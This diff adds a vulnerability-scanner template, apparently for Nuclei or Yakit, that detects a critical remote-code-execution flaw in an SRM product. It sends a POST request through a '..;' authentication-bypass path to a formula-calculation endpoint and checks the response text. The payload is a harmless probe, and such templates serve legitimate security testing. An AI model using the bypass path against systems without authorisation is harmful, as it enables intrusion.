@@ -1,0 +1,37 @@
+id: srm-js-rce
+
+info:
+  name: srm-js-rce
+  author: admin
+  severity: critical
+  description: js-rce
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+  yakit-info:
+    sign: b515854c2e7a9d3c49db5c386fbba610
+
+http:
+- method: POST
+  path:
+  - '{{RootURL}}/api/..;/costModule/formula/material/info/calculate'
+  headers:
+    Accept: '*/*'
+    Content-Length: "92"
+    Content-Type: application/x-www-form-urlencoded
+    X-Requested-With: XMLHttpRequest
+  body: moduleFormula=A&formulaCalcJson=[{"componentText":"A","componentValue":"2"}]
+
+  max-redirects: 3
+  disable-cookie: true
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - no program is executed!
+    condition: and
+
+
+# Generated From WebFuzzer on 2026-01-22 15:59:52
